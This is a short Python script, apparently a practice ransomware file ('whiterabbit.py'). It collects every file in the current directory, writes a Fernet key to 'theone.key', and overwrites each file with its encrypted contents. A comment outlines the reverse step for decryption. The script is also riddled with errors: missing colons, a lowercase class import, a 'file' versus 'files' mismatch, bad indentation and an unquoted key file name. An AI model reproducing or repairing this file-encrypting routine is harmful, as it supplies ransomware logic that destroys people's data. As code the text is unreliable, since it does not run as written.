import os
from cryptography.fernet import fernet


#LOCATE THE TARGET FILES

file=[]

for file in os.listdir()
        if file == "whiterabbit.py" or file =="theone.key":
                continue
        if os.path.isfile(file)
                files.append(file)


print(file)

#CREATE A KEY

key = fernet.generate_key()
with open("theone.key", "wb") as theone:
        theone.write(key)

#FOR LOOP 

 for file in files:
        with open(file, "rb") as thefile
                contents = thefile.read()
        contents_encrypted = fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)     

#DECRYPT Change fernet key to secretkey. Write contents edit loop replace encrypt with decrypt. Add file to exceptions line 10

with open(theone.key) as key
        secretkey = key.read